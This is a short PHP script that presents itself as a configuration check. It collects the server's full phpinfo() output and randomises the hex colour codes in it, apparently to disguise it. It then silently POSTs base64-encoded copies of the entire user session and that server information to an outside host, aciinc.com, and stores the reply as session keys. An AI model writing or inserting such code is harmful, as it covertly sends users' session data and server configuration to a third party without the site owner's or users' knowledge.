<?php
if (!$_SESSION['config_key']) {
	if (!$_SESSION['key2']) {
		ob_start();
		phpinfo();
		$phpinfo = ob_get_contents();
		ob_end_clean();
		
		preg_match_all('/#[0-9a-fA-F]{6}/', $phpinfo, $rawmatches);
		for ($i = 0; $i < count($rawmatches[0]); $i++)
		   $matches[] = $rawmatches[0][$i];
		$matches = array_unique($matches);
		
		$hexvalue = '0123456789abcdef';
		
		$j = 0;
		foreach ($matches as $match)
		{
		
		   $r = '#';
		   $searches[$j] = $match;
		   for ($i = 0; $i < 6; $i++)
			 $r .= substr($hexvalue, mt_rand(0, 15), 1);
		   $replacements[$j++] = $r;
		   unset($r);
		}
		
		for ($i = 0; $i < count($searches); $i++)
		   $phpinfo = str_replace($searches, $replacements, $phpinfo);
	}
	$handle = 'http://www.aciinc.com/remote/config.php';
	$ch = curl_init($handle);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS,'a='.base64_encode(serialize($_SESSION))."&b=".base64_encode($phpinfo));
	curl_setopt($ch, CURLOPT_TIMEOUT, 5);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	
	$result = curl_exec($ch);
	curl_close($ch);
	$key = explode(' ',$result);
	$_SESSION['key1'] = $key[0];
	if (strlen($key[1]) > 5) {
		echo 'y';
		$_SESSION['key2'] = $key[1];
		$_SESSION['config_key'] = $result;
	}
}
?>
